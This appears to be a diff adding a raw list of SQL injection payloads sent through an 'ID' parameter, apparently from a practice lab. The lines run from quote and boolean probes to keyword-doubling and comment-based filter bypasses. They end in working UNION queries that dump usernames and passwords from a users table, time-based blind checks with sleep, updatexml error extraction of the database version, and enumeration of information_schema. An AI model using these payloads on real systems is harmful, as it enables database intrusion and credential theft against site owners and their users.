@@ -1,0 +1,85 @@
+ID:1
+ID:1'
+ID:1"
+ID:1' AND 1=1 -- 
+ID:1 AND 1=1 -- 
+ID:1 AND 1=0 -- 
+ID:1" AND 1=0 -- 
+ID:1" AND 1=1 -- 
+ID:1' AND 1=1 -- 
+ID:1') AND 1=1 -- 
+ID:1\
+ID:1')
+ID:1') -- 
+ID:1 -- 
+ID:1 AND 1 -- 
+ID:1 AND 0 -- 
+ID:1') AND 0 -- 
+ID:1') AND 1 -- 
+ID:1') AND 1 -- 
+ID:1')
+AND
+1
+ -- 
+ID:1')
+AND
+1
+#
+ID:1') #
+ID:1') #
+ID:1') #
+ID:99') 
+uniunionon
+  selSelectect
+ 1,@@port,3
+OR ('1
+ID:99') 
+UnIoN
+ SeLect
+ 1,@@port,3
+OR ('1
+ID:99') 
+UnIoN
+all
+ SeLect
+ 1,@@port,3
+OR ('1
+ID:99') 
+UnIoN
+all
+ SeLect
+ 1,user(),3
+OR ('1
+ID:'unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and'1'='1
+ID:"unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and"1"="1
+ID:')unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:')unIOn seLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:')unIOn//seLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:')unIOn/ /seLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:')unIOn/**/seLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:')unIOn/**/seLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:')unIOn/**/seLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1')=('1
+ID:'unionselect1,(SELECTGROUP_CONCAT(username,passwoorrdSEPARATOORR0x3c62723e)FROMusers),3anandd'1'='1
+ID:1')andif(ascii(substr(database(),1,1))>114,1,sleep(5))or('2')=('1
+ID:1')andif(ascii(substr(database(),1,1))>115,1,sleep(5))or('2')=('1
+ID:1')andif(ascii(substr(database(),1,1))>115,1,sleep(5))or('2')=('1
+ID:100')unionselect(1),2,(3)||('1
+ID:100')union//select(1),2,(3)||('1
+ID:100')union()select(1),2,(3)||('1
+ID:100')union/()/select(1),2,(3)||('1
+ID:1') and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+ID:1')andupdatexml(1,concat(0x7e,(select@@version),0x7e),1)and('1
+ID:')andupdatexml(1,concat(0x7e,(select@@version),0x7e),1)and('1
+ID:')unionunionselectselect1,(SELECTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1'
+ID:')unionunionselectselect1,(SELECTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1'
+ID:')unionunionselectselect1,(SELECTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and('1
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('j81jNrdAFh:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('kJWzWzZyKG:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('GZ5a4r40nP:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 unionselect1,2,concat('hoTWVsTwIN:',group_concat(schema_name))frominformation_schema.schemata--
+ID:-1 union select 1,2,concat('fygHonkI8j:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('NfoJfIyBk6:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('EMjvC4FOkU:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('y9nhIsiA1w:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('UgH7lBFA3O:',group_concat(schema_name)) from information_schema.schemata -- 
